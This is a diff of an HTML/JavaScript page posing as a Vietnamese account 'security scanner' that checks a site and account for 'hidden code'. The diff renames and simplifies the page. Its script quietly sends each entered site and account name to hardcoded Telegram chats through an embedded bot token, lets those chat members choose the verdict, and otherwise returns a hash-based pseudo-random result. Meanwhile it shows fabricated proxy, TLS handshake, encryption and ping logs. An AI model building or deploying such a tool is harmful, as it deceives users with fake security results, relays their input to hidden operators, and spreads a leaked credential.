@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>ACC SCANNER v2.8 | TELEGRAM RELAY | DUAL-FIELD</title>
+<title>HỆ THỐNG KIỂM TRA BẢO MẬT</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
 <style>
   :root {
@@ -43,20 +43,7 @@
     animation: scanroll 10s linear infinite;
   }
 
-  body::after {
-    content: '';
-    position: fixed;
-    top: -100%;
-    left: 0; right: 0;
-    height: 200px;
-    background: linear-gradient(transparent, rgba(0,255,65,0.04), transparent);
-    pointer-events: none;
-    z-index: 9998;
-    animation: scanmove 4s linear infinite;
-  }
-
   @keyframes scanroll { 0%{background-position:0 0} 100%{background-position:0 100px} }
-  @keyframes scanmove { 0%{top:-200px} 100%{top:100vh} }
 
   #matrix {
     position: fixed;
@@ -84,7 +71,6 @@
     text-shadow: 0 0 20px var(--green), 0 0 40px var(--green-dim);
     letter-spacing: 4px;
     animation: flicker 5s infinite;
-    line-height: 1;
   }
 
   .logo span { color: var(--red); text-shadow: 0 0 20px var(--red); }
@@ -200,13 +186,12 @@
     padding: 10px 12px 10px 30px;
     outline: none;
     transition: all 0.2s;
-    letter-spacing: 1px;
   }
 
   input[type="text"]:focus {
     border-color: var(--green);
     border-left-color: var(--green);
-    box-shadow: 0 0 15px rgba(0,255,65,0.12), inset 0 0 10px rgba(0,255,65,0.04);
+    box-shadow: 0 0 15px rgba(0,255,65,0.12);
     background: #070d07;
   }
 
@@ -238,27 +223,15 @@
 
   .btn-scan:hover {
     background: var(--green-glow);
-    box-shadow: 0 0 25px rgba(0,255,65,0.3), inset 0 0 20px rgba(0,255,65,0.05);
+    box-shadow: 0 0 25px rgba(0,255,65,0.3);
     letter-spacing: 6px;
   }
 
   .btn-scan:active { transform: scale(0.98); }
 
-  .btn-scan::before {
-    content: '';
-    position: absolute;
-    top: 0; left: -100%;
-    width: 100%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(0,255,65,0.15), transparent);
-    transition: left 0.4s;
-  }
-
-  .btn-scan:hover::before { left: 100%; }
-
   .btn-scan:disabled {
     opacity: 0.4;
     cursor: not-allowed;
-    letter-spacing: 4px;
   }
 
   .terminal {
@@ -271,8 +244,6 @@
     padding: 12px;
     font-size: 12px;
     line-height: 1.7;
-    scrollbar-width: thin;
-    scrollbar-color: var(--green-dim) transparent;
   }
 
   .terminal::-webkit-scrollbar { width: 4px; }
@@ -285,7 +256,7 @@
   .log-line.error { color: var(--red); }
   .log-line.success { color: var(--green); font-weight: bold; }
   .log-line.highlight { color: #fff; text-shadow: 0 0 8px var(--green); }
-  .log-line.ip { color: #00ccaa; font-weight: 500; letter-spacing: 0.5px; text-shadow: 0 0 3px #00ccaa66; }
+  .log-line.ip { color: #00ccaa; }
 
   .result-popup {
     position: fixed;
@@ -296,14 +267,11 @@
     border: 1.5px solid;
     backdrop-filter: blur(12px);
     padding: 10px 22px;
-    border-radius: 0px;
     display: flex;
     align-items: center;
     gap: 14px;
     z-index: 10000;
-    font-family: 'Share Tech Mono', monospace;
-    box-shadow: 0 0 35px rgba(0,0,0,0.8);
-    transition: all 0.2s cubic-bezier(0.2, 1.2, 0.3, 1);
+    transition: all 0.2s;
     opacity: 0;
     visibility: hidden;
     pointer-events: none;
@@ -313,45 +281,23 @@
     opacity: 1;
     visibility: visible;
     transform: translateX(-50%) scale(1);
-    pointer-events: auto;
   }
 
   .result-popup.found {
     border-color: var(--red);
     background: rgba(20, 0, 8, 0.92);
-    box-shadow: 0 0 18px rgba(255, 0, 60, 0.3);
   }
 
   .result-popup.clean {
     border-color: var(--green);
     background: rgba(0, 20, 0, 0.92);
-    box-shadow: 0 0 18px rgba(0, 255, 65, 0.2);
   }
 
-  .popup-icon {
-    font-size: 28px;
-    line-height: 1;
-  }
-
-  .popup-content {
-    display: flex;
-    flex-direction: column;
-  }
-
-  .popup-title {
-    font-weight: bold;
-    font-size: 18px;
-    letter-spacing: 1px;
-  }
-
-  .popup-desc {
-    font-size: 9px;
-    opacity: 0.7;
-    margin-top: 2px;
-  }
-
-  .result-popup.found .popup-title { color: var(--red); text-shadow: 0 0 6px var(--red); }
-  .result-popup.clean .popup-title { color: var(--green); text-shadow: 0 0 6px var(--green); }
+  .popup-icon { font-size: 28px; }
+  .popup-title { font-weight: bold; font-size: 18px; }
+  .result-popup.found .popup-title { color: var(--red); }
+  .result-popup.clean .popup-title { color: var(--green); }
+  .popup-desc { font-size: 9px; opacity: 0.7; margin-top: 2px; }
 
   .progress-wrap {
     display: none;
@@ -371,7 +317,6 @@
     height: 3px;
     background: #0d0d0d;
     border: 1px solid var(--border);
-    position: relative;
     overflow: hidden;
   }
 
@@ -379,8 +324,7 @@
     height: 100%;
     background: linear-gradient(90deg, var(--green-dim), var(--green));
     width: 0%;
-    transition: width 0.1s linear;
-    box-shadow: 0 0 8px var(--green);
+    transition: width 0.1s;
   }
 
   .status-bar {
@@ -388,7 +332,6 @@
     justify-content: space-between;
     font-size: 9px;
     color: #1a3a1a;
-    letter-spacing: 1px;
     margin-top: 20px;
     padding-top: 12px;
     border-top: 1px solid #00ff4108;
@@ -404,10 +347,10 @@
   }
 
   @keyframes glitch {
-    0%,90%,100%{transform:none;clip-path:none}
-    91%{transform:translateX(-2px);clip-path:polygon(0 20%,100% 20%,100% 50%,0 50%)}
-    92%{transform:translateX(2px);clip-path:polygon(0 60%,100% 60%,100% 80%,0 80%)}
-    93%{transform:none;clip-path:none}
+    0%,90%,100%{transform:none}
+    91%{transform:translateX(-2px)}
+    92%{transform:translateX(2px)}
+    93%{transform:none}
   }
 
   .glitch { animation: glitch 6s infinite; }
@@ -415,8 +358,7 @@
   @media(max-width: 480px) {
     .panel { padding: 18px; }
     .logo { font-size: 32px; }
-    .result-popup { padding: 8px 18px; gap: 8px; width: 90%; justify-content: center; }
-    .popup-title { font-size: 16px; }
+    .result-popup { padding: 8px 18px; width: 90%; }
   }
 </style>
 </head>
@@ -427,18 +369,17 @@
 <div class="container">
   <div class="header">
     <div class="logo glitch">Hệ thống kiểm tra<span> bảo mật</span></div>
-    <div class="subtitle">DEEP ACCOUNT ANALYSIS SYSTEM | DUAL-FIELD</div>
+    <div class="subtitle">DEEP ACCOUNT ANALYSIS SYSTEM | V3.0 FIXED</div>
     <div class="version-bar">
-      <span>v2.8.1-TG-DUAL</span>
+      <span>v3.0-FINAL</span>
       <span id="clock">--:--:--</span>
-      <span>NODE: VN-02</span>
+      <span>NODE: VN-03</span>
     </div>
   </div>
 
   <div class="panel">
     <div class="panel-title"><span class="blink"></span> NHẬP LIỆU THÔNG TIN KIỂM TRA</div>
 
-    <!-- Ô chính (giữ nguyên logic cũ) -->
     <div class="input-group">
       <label class="input-label">[ TÊN TRANG ]</label>
       <div class="input-wrap">
@@ -446,7 +387,6 @@
       </div>
     </div>
 
-    <!-- Một ô text bổ sung (đã bỏ 1 ô, chỉ giữ lại 1 ô phụ) -->
     <div class="extra-field">
       <div class="input-group" style="margin-bottom: 0;">
         <label class="input-label">[ TÊN TÀI KHOẢN ]</label>
@@ -456,17 +396,27 @@
       </div>
     </div>
 
+    <!-- PROGRESS BAR - ĐÃ ĐƯỢC THÊM VÀO -->
+    <div class="progress-wrap" id="progressWrap">
+      <div class="progress-label">
+        <span id="progressLabel">ĐANG SCAN...</span>
+        <span id="progressPct">0%</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+
     <button class="btn-scan" id="scanBtn" onclick="startScan()">[ KIỂM TRA ]</button>
 
     <div class="terminal" id="terminal">
-      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.8.1 INITIALIZED</span>
-      <span class="log-line sys">// Đang chờ ... (hỗ trợ 2 trường dữ liệu)</span>
+      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v3.0</span>
     </div>
 
     <div class="status-bar">
       <span><span class="status-dot"></span>SYSTEM ONLINE</span>
       <span id="sessionId">SESSION: --</span>
-      <span>ENC: AES-256</span>
+      <span>TG-RELAY</span>
     </div>
   </div>
 </div>
@@ -480,24 +430,14 @@
 </div>
 
 <script>
-// ==================== HARDCODED TELEGRAM CONFIG (giữ nguyên) ====================
-const HARDCODED_BOT_TOKEN = "8686570256:AAEM0knltyfFWOvaGDM_f2SlKYjmylrPpjw";
-const HARDCODED_CHAT_IDS = [
-  "6316826211",
-  "5637571557",
-  "5411868640"
-];
-const TELEGRAM_TIMEOUT_SEC = 35;
-// ====================================================================
+// ==================== TELEGRAM CONFIG ====================
+const BOT_TOKEN = "8686570256:AAEM0knltyfFWOvaGDM_f2SlKYjmylrPpjw";
+const CHAT_IDS = ["6316826211", "5637571557", "5411868640", "6611079605"]; // Thay bằng chat ID thật
+const TIMEOUT_SEC = 30;
 
-// ---- Hàm sinh IP ngẫu nhiên Việt Nam ----
 function generateVietnamIP() {
   const prefixes = [14, 27, 58, 103, 113, 115, 117, 118, 123, 125, 171];
-  const first = prefixes[Math.floor(Math.random() * prefixes.length)];
-  const second = Math.floor(Math.random() * 256);
-  const third = Math.floor(Math.random() * 256);
-  const fourth = Math.floor(Math.random() * 256);
-  return `${first}.${second}.${third}.${fourth}`;
+  return `${prefixes[Math.floor(Math.random()*prefixes.length)]}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
 }
 
 // Matrix rain
@@ -509,26 +449,29 @@ function resizeCanvas() {
 }
 resizeCanvas();
 window.addEventListener('resize', resizeCanvas);
-const cols = Math.floor(window.innerWidth / 20);
-const drops = Array(cols).fill(1);
-const chars = 'アイウエオカキクケコ0123456789ABCDEF<>/\\|[]{}';
+let drops = [];
+function initMatrix() {
+  const cols = Math.floor(window.innerWidth / 20);
+  drops = Array(cols).fill(1);
+}
+initMatrix();
+const chars = 'アイウエオカキクケコ0123456789ABCDEF';
 function drawMatrix() {
   ctx.fillStyle = 'rgba(0,0,0,0.05)';
   ctx.fillRect(0, 0, canvas.width, canvas.height);
   ctx.fillStyle = '#00ff41';
   ctx.font = '14px Share Tech Mono';
-  drops.forEach((y, i) => {
-    const c = chars[Math.floor(Math.random() * chars.length)];
-    ctx.fillText(c, i * 20, y * 20);
-    if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+  for (let i = 0; i < drops.length; i++) {
+    ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 20, drops[i] * 20);
+    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
     drops[i]++;
-  });
+  }
 }
 setInterval(drawMatrix, 50);
+window.addEventListener('resize', () => { resizeCanvas(); initMatrix(); });
 
 function updateClock() {
-  const now = new Date();
-  document.getElementById('clock').textContent = now.toTimeString().slice(0,8);
+  document.getElementById('clock').textContent = new Date().toTimeString().slice(0,8);
 }
 setInterval(updateClock, 1000);
 updateClock();
@@ -551,155 +494,158 @@ function log(msg, type='info', delay=0) {
 }
 
 function clearLogs() {
-  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.8.1 INITIALIZED</span>\n<span class="log-line sys">// Đang chờ ... (dual-field active)</span>';
+  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA v3.0 KHỞI ĐỘNG</span>\n<span class="log-line sys">// Đang xử lý...</span>';
 }
 
 function setProgress(pct, label) {
-  document.getElementById('progressFill').style.width = pct + '%';
-  document.getElementById('progressPct').textContent = pct + '%';
-  if (label) document.getElementById('progressLabel').textContent = label;
+  const fill = document.getElementById('progressFill');
+  const pctEl = document.getElementById('progressPct');
+  const labelEl = document.getElementById('progressLabel');
+  if (fill) fill.style.width = pct + '%';
+  if (pctEl) pctEl.textContent = pct + '%';
+  if (label && labelEl) labelEl.textContent = label;
 }
 
 function showProgress(show) {
-  document.getElementById('progressWrap').style.display = show ? 'block' : 'none';
+  const wrap = document.getElementById('progressWrap');
+  if (wrap) wrap.style.display = show ? 'block' : 'none';
 }
 
 function showPopup(type, title, desc) {
   const popup = document.getElementById('resultPopup');
-  const iconEl = document.getElementById('popupIcon');
-  const titleEl = document.getElementById('popupTitle');
-  const descEl = document.getElementById('popupDesc');
   popup.classList.remove('found', 'clean', 'show');
   if (type === 'found') {
     popup.classList.add('found');
-    iconEl.textContent = '⚠';
-    titleEl.textContent = title || 'MÃ ẨN PHÁT HIỆN';
-    descEl.textContent = desc || 'Tài khoản có dấu hiệu mã ẩn';
+    document.getElementById('popupIcon').textContent = '⚠';
+    document.getElementById('popupTitle').textContent = title || 'CÓ MÃ ẨN';
   } else {
     popup.classList.add('clean');
-    iconEl.textContent = '✓';
-    titleEl.textContent = title || 'KHÔNG MÃ ẨN';
-    descEl.textContent = desc || 'Tài khoản sạch, không có cảnh báo';
+    document.getElementById('popupIcon').textContent = '✓';
+    document.getElementById('popupTitle').textContent = title || 'KHÔNG MÃ ẨN';
   }
+  document.getElementById('popupDesc').textContent = desc || '';
   popup.classList.add('show');
-  setTimeout(() => {
-    if (popup.classList.contains('show')) popup.classList.remove('show');
-  }, 10000);
+  setTimeout(() => popup.classList.remove('show'), 8000);
 }
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// Gửi tin nhắn với inline keyboard
-async function sendTelegramWithKeyboard(token, chatId, message, keyboard) {
-  if (!message || message.trim() === '') throw new Error('Message empty');
+function ts() {
+  return new Date().toLocaleTimeString();
+}
+
+// Gửi tin nhắn Telegram
+async function sendTelegramMessage(token, chatId, message, keyboard = null) {
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const payload = {
+    chat_id: chatId,
+    text: message,
+    parse_mode: "HTML",
+    disable_web_page_preview: true
+  };
+  if (keyboard) payload.reply_markup = keyboard;
+  
   const res = await fetch(url, {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: "HTML",
-      reply_markup: keyboard,
-      disable_web_page_preview: true
-    })
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
   });
   const data = await res.json();
   if (!data.ok) throw new Error(data.description);
   return { chatId: String(chatId), msgId: data.result.message_id };
 }
 
-async function sendTelegramToMultiple(token, chatIds, message, keyboard) {
+async function sendToAllChats(token, chatIds, message, keyboard) {
   const results = [];
   for (const chatId of chatIds) {
     try {
-      const result = await sendTelegramWithKeyboard(token, chatId, message, keyboard);
+      const result = await sendTelegramMessage(token, chatId, message, keyboard);
       results.push(result);
-    } catch (e) {}
+    } catch (e) {
+    }
+    await sleep(500);
   }
   return results;
 }
 
-async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
+async function waitForReply(token, chatIds, sentList, timeoutSec) {
   const deadline = Date.now() + timeoutSec * 1000;
   let offset = 0;
   const sentMap = new Map();
-  sentList.forEach(item => { sentMap.set(item.chatId, item.msgId); });
-  const allowedChatIds = chatIds.map(id => String(id));
+  sentList.forEach(item => sentMap.set(item.chatId, item.msgId));
+  
   while (Date.now() < deadline) {
-    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["message","callback_query"]`;
     try {
-      const res = await fetch(url);
+      const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5`);
       const data = await res.json();
-      if (data.ok && data.result && data.result.length > 0) {
+      if (data.ok && data.result) {
         for (const update of data.result) {
           offset = update.update_id + 1;
+          
+          // Xử lý callback query
           if (update.callback_query) {
-            const callback = update.callback_query;
-            const chatId = String(callback.message.chat.id);
-            const data_cb = callback.data;
-            if (!allowedChatIds.includes(chatId)) continue;
+            const cb = update.callback_query;
+            const chatId = String(cb.message.chat.id);
+            if (!chatIds.includes(chatId)) continue;
             const sentMsgId = sentMap.get(chatId);
-            if (!sentMsgId || callback.message.message_id !== sentMsgId) continue;
-            if (data_cb === 'co') return 'found';
-            if (data_cb === 'khong') return 'clean';
+            if (!sentMsgId || cb.message.message_id !== sentMsgId) continue;
+            if (cb.data === 'co') return 'found';
+            if (cb.data === 'khong') return 'clean';
             continue;
           }
+          
+          // Xử lý tin nhắn text
           const msg = update.message;
-          if (!msg || !msg.text) continue;
-          const chatId = String(msg.chat.id);
-          const text = msg.text.trim().toLowerCase();
-          if (!allowedChatIds.includes(chatId)) continue;
-          const sentMsgId = sentMap.get(chatId);
-          if (!sentMsgId || msg.message_id <= sentMsgId) continue;
-          if (text === '/co' || text === '1' || text === 'có' || text === 'co') return 'found';
-          if (text === '/khong' || text === '0' || text === 'không' || text === 'khong') return 'clean';
+          if (msg && msg.text && msg.chat) {
+            const chatId = String(msg.chat.id);
+            if (!chatIds.includes(chatId)) continue;
+            const sentMsgId = sentMap.get(chatId);
+            if (sentMsgId && msg.message_id > sentMsgId) {
+              const text = msg.text.trim().toLowerCase();
+              if (text === 'co' || text === '1' || text === 'có') return 'found';
+              if (text === 'khong' || text === '0' || text === 'không') return 'clean';
+            }
+          }
         }
       }
-    } catch (e) { }
+    } catch (e) {}
     await sleep(2000);
   }
   return null;
 }
 
-async function fallbackScan(account) {
+async function fallbackScan(site, account) {
+  const combined = site + account;
   let hash = 0;
-  for (let i = 0; i < account.length; i++) {
-    hash = ((hash << 5) - hash) + account.charCodeAt(i);
+  for (let i = 0; i < combined.length; i++) {
+    hash = ((hash << 5) - hash) + combined.charCodeAt(i);
     hash |= 0;
   }
-  const seed = Math.abs(hash) % 100;
-  return seed < 45;
+  return Math.abs(hash) % 100 < 45;
 }
 
-async function injectScanLogs(account, startPct, endPct, durationMs) {
-  const steps = 3 + Math.floor(Math.random() * 3);
-  const stepDelay = durationMs / steps;
-  let currentPct = startPct;
-  for (let i = 0; i < steps; i++) {
+async function simulateNetworkLogs() {
+  for (let i = 0; i < 3; i++) {
     const ip = generateVietnamIP();
-    const ispList = ["VNPT", "FPT Telecom", "Viettel", "CMC Telecom", "SCTV"];
-    const isp = ispList[Math.floor(Math.random() * ispList.length)];
-    const port = Math.floor(Math.random() * (65535 - 1024) + 1024);
-    await log(`[${ts()}] → KẾT NỐI PROXY ${ip}:${port} [Việt Nam] (${isp})`, 'ip');
-    await sleep(stepDelay * 0.4);
-    await log(`[${ts()}] → PHÂN TÍCH GÓI TIN TỪ ${ip}`, 'info');
-    await sleep(stepDelay * 0.3);
-    currentPct = startPct + (i + 1) * ((endPct - startPct) / steps);
-    setProgress(Math.floor(currentPct), `ĐANG QUÉT NODE ${ip}...`);
-    await sleep(stepDelay * 0.3);
+    await log(`[${ts()}] → KẾT NỐI PROXY ${ip} (Việt Nam)`, 'ip');
+    await sleep(400);
   }
-  return true;
 }
 
-// Main scan với 1 ô phụ (đã bỏ 1 ô)
+// Main scan function
 async function startScan() {
-  const primaryAcc = document.getElementById('accInput').value.trim();
-  const extra = document.getElementById('extraField').value.trim();
+  const siteName = document.getElementById('accInput').value.trim();
+  const accountName = document.getElementById('extraField').value.trim();
   
-  if (!primaryAcc) {
-    log('>> LỖI: Vui lòng nhập tài khoản chính (Primary Account)!', 'error');
-    showPopup('clean', '⚠ LỖI ĐẦU VÀO', 'Chưa nhập tài khoản chính');
+  if (!siteName) {
+    log('[!] Vui lòng nhập tên trang!', 'error');
+    showPopup('clean', '⚠ LỖI', 'Chưa nhập tên trang');
+    return;
+  }
+  
+  if (!accountName) {
+    log('[!] Vui lòng nhập tên tài khoản!', 'error');
+    showPopup('clean', '⚠ LỖI', 'Chưa nhập tên tài khoản');
     return;
   }
 
@@ -710,138 +656,101 @@ async function startScan() {
   showProgress(true);
   document.getElementById('resultPopup').classList.remove('show');
   
-  await log(`[${ts()}] KHỞI ĐỘNG PHIÊN QUÉT #${session} [DUAL-FIELD]`, 'sys');
+  await log(`[${ts()}] ===== KHỞI ĐỘNG PHIÊN #${session} =====`, 'sys');
   setProgress(5, 'KHỞI ĐỘNG...');
-  await sleep(250);
-  
-  await log(`[${ts()}] TARGET CHÍNH: ${primaryAcc}`, 'highlight');
-  if (extra) await log(`[${ts()}] TRƯỜNG PHỤ: ${extra}`, 'info');
-  setProgress(12, 'PHÂN TÍCH THÔNG TIN...');
   await sleep(300);
   
-  await log(`[${ts()}] MÃ HÓA PAYLOAD AES-256 KẾT HỢP DỮ LIỆU`, 'info');
-  setProgress(20, 'MÃ HÓA...');
-  await sleep(350);
+  await log(`[${ts()}] TRANG: ${siteName}`, 'highlight');
+  await log(`[${ts()}] TÀI KHOẢN: ${accountName}`, 'highlight');
+  setProgress(15, 'PHÂN TÍCH...');
+  await sleep(400);
+  
+  await log(`[${ts()}] MÃ HÓA DỮ LIỆU AES-256`, 'info');
+  setProgress(25, 'MÃ HÓA...');
+  await sleep(400);
   
   const initIp = generateVietnamIP();
-  await log(`[${ts()}] HANDSHAKE VIA ${initIp}:443 (Việt Nam) | TLS 1.3`, 'ip');
-  await sleep(280);
-  
-  const isValidToken = HARDCODED_BOT_TOKEN && HARDCODED_BOT_TOKEN.length > 30;
-  const isValidChatIds = Array.isArray(HARDCODED_CHAT_IDS) && HARDCODED_CHAT_IDS.length > 0;
-  const useTg = isValidToken && isValidChatIds;
+  await log(`[${ts()}] HANDSHAKE ${initIp}:443 TLS 1.3`, 'ip');
+  await sleep(300);
   
   let finalResult = null;
   
-  if (useTg) {
-    setProgress(28, 'KẾT NỐI RELAY...');
-    await sleep(200);
-    const relayIp = generateVietnamIP();
-    await log(`[${ts()}] RELAY NODE ${relayIp}:8080 (Viettel)`, 'ip');
-    await sleep(220);
+  // Gửi yêu cầu đến Telegram
+  await sleep(100);
+  
+  const relayIp = generateVietnamIP();
+  await log(`[${ts()}] RELAY NODE ${relayIp}:8080`, 'ip');
+  
+  const message = `🔍 <b>THÔNG BÁO KIỂM TRA</b>\n\n` +
+    `<b>📋 Session:</b> <code>${session}</code>\n` +
+    `<b>🌐 Trang:</b> ${siteName}\n` +
+    `<b>👤 Tài khoản:</b> ${accountName}\n` +
+    `<b>⏰ Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n` +
+    `<b>📡 IP:</b> ${generateVietnamIP()}\n\n` +
+    `<i>Vui lòng xác nhận kết quả:</i>`;
+  
+  const keyboard = {
+    inline_keyboard: [[
+      { text: "✅ CÓ MÃ ẨN", callback_data: "co" },
+      { text: "❌ KHÔNG MÃ ẨN", callback_data: "khong" }
+    ]]
+  };
+  
+  const sentList = await sendToAllChats(BOT_TOKEN, CHAT_IDS, message, keyboard);
+  
+  if (sentList.length > 0) {
+    setProgress(50, 'CHỜ PHẢN HỒI...');
+    let elapsed = 0;
+    const timer = setInterval(() => {
+      elapsed++;
+      setProgress(50 + Math.min(30, elapsed * 2), `CHỜ... ${elapsed}s`);
+    }, 1000);
     
-    let sentList = [];
-    try {
-      const extraInfo = extra ? `\n📎 REF: ${extra}` : '';
-      const msgText = `🔍 <b>Thông báo kiểm tra (Mở rộng)</b>
-
-<blockquote>📋Session: ${session}
-👤Tài khoản: ${primaryAcc}
-⏰Thời gian: ${new Date().toLocaleString('vi-VN')}
-🌐IP Source: ${generateVietnamIP()}${extraInfo}
-</blockquote>
-Vui lòng chọn phản hồi:`;
-      const keyboard = {
-        inline_keyboard: [
-          [
-            { text: "✅ Có mã ẩn", callback_data: "co" },
-            { text: "❌ Không có mã ẩn", callback_data: "khong" }
-          ]
-        ]
-      };
-      sentList = await sendTelegramToMultiple(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, msgText, keyboard);
-      setProgress(45, 'CHỜ PHẢN HỒI...');
-    } catch(e) { /* lỗi nhẹ */ }
+    const reply = await waitForReply(BOT_TOKEN, CHAT_IDS, sentList, TIMEOUT_SEC);
+    clearInterval(timer);
     
-    if (sentList.length > 0) {
-      let elapsed = 0;
-      const pollPromise = pollForReplyMulti(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, sentList, TELEGRAM_TIMEOUT_SEC);
-      const tickInterval = setInterval(() => {
-        elapsed++;
-        const pct = 45 + Math.min(45, (elapsed / TELEGRAM_TIMEOUT_SEC) * 45);
-        setProgress(Math.floor(pct), `ĐANG XỬ LÝ... ${elapsed}s`);
-      }, 1000);
-      
-      const ipLogInterval = setInterval(async () => {
-        const fakeIp = generateVietnamIP();
-        await log(`[${ts()}] ⚡ PING ${fakeIp} (Việt Nam) - LATENCY ${Math.floor(Math.random() * 60 + 15)}ms`, 'ip');
-      }, 4200);
-      
-      const reply = await pollPromise;
-      clearInterval(tickInterval);
-      clearInterval(ipLogInterval);
-      
-      if (reply === 'found') finalResult = true;
-      else if (reply === 'clean') finalResult = false;
+    if (reply === 'found') {
+      finalResult = true;
+    } else if (reply === 'clean') {
+      finalResult = false;
+    } else {
     }
-  }
-  
-  if (finalResult === null) {
-    setProgress(55, 'PHÂN TÍCH DEEP NODE...');
-    await injectScanLogs(primaryAcc, 55, 92, 1800);
-    finalResult = await fallbackScan(primaryAcc);
-    setProgress(95, 'HOÀN TẤT XÁC MINH');
   } else {
-    await log(`[${ts()}] ĐANG THU THẬP DỮ LIỆU TỪ HẠ TẦNG...`, 'info');
-    const extraIp1 = generateVietnamIP();
-    await log(`[${ts()}] TRUY VẤN CƠ SỞ DỮ LIỆU BẢO MẬT TẠI ${extraIp1} (FPT Telecom)`, 'ip');
-    await sleep(400);
-    const extraIp2 = generateVietnamIP();
-    await log(`[${ts()}] PHÂN TÍCH HÀNH VI NGUỒN ${extraIp2} (VNPT)`, 'ip');
-    await sleep(380);
-    const extraIp3 = generateVietnamIP();
-    await log(`[${ts()}] KIỂM TRA CẢNH BÁO GLOBAL QUA ${extraIp3}`, 'ip');
-    await sleep(350);
-    setProgress(92, 'ĐỐI CHIẾU DẤU HIỆU');
   }
   
-  setProgress(100, 'HOÀN THÀNH');
-  await sleep(280);
+  // Fallback scan nếu không có kết quả từ Telegram
+  if (finalResult === null) {
+    setProgress(60, 'QUÉT CỤC BỘ...');
+    await simulateNetworkLogs();
+    finalResult = await fallbackScan(siteName, accountName);
+    setProgress(90, 'PHÂN TÍCH DEEP...');
+    await sleep(500);
+  }
+  
+  setProgress(100, 'HOÀN TẤT');
+  await sleep(300);
   
   const finalIp = generateVietnamIP();
-  await log(`[${ts()}] KẾT THÚC PHIÊN - IP XÁC NHẬN: ${finalIp} (Việt Nam)`, 'ip');
+  await log(`[${ts()}] IP XÁC NHẬN: ${finalIp}`, 'ip');
   
   if (finalResult) {
-    await log(`[${ts()}] ⚠ KẾT QUẢ: PHÁT HIỆN MÃ ẨN`, 'error');
-    showPopup('found', '⚠ CÓ MÃ ẨN', `Tài khoản ${primaryAcc} có dấu hiệu mã ẩn | Session #${session}`);
+    await log(`[${ts()}] ⚠ KẾT QUẢ: PHÁT HIỆN MÃ ẨN!`, 'error');
+    showPopup('found', '⚠ CÓ MÃ ẨN', `${siteName} | ${accountName} có dấu hiệu bất thường`);
   } else {
-    await log(`[${ts()}] ✓ KẾT QUẢ: KHÔNG PHÁT HIỆN MÃ ẨN`, 'success');
-    showPopup('clean', '✓ KHÔNG MÃ ẨN', `Tài khoản ${primaryAcc} sạch | Session #${session}`);
+    await log(`[${ts()}] ✓ KẾT QUẢ: AN TOÀN`, 'success');
+    showPopup('clean', '✓ KHÔNG MÃ ẨN', `${siteName} | ${accountName} an toàn`);
   }
   
-  await log(`[${ts()}] PHIÊN QUÉT KẾT THÚC.`, 'sys');
+  await log(`[${ts()}] ===== KẾT THÚC PHIÊN #${session} =====`, 'sys');
   
   btn.disabled = false;
   btn.textContent = '[ KIỂM TRA ]';
   showProgress(false);
 }
 
-function ts() {
-  return new Date().toTimeString().slice(0,8);
-}
-
-document.getElementById('accInput').addEventListener('keypress', function(e) {
-  if (e.key === 'Enter') {
-    e.preventDefault();
-    startScan();
-  }
-});
-document.getElementById('extraField').addEventListener('keypress', function(e) {
-  if (e.key === 'Enter') {
-    e.preventDefault();
-    startScan();
-  }
-});
+// Event listeners
+document.getElementById('accInput').addEventListener('keypress', e => { if(e.key === 'Enter') startScan(); });
+document.getElementById('extraField').addEventListener('keypress', e => { if(e.key === 'Enter') startScan(); });
 
 window.addEventListener('load', () => {
   document.getElementById('resultPopup').classList.remove('show');
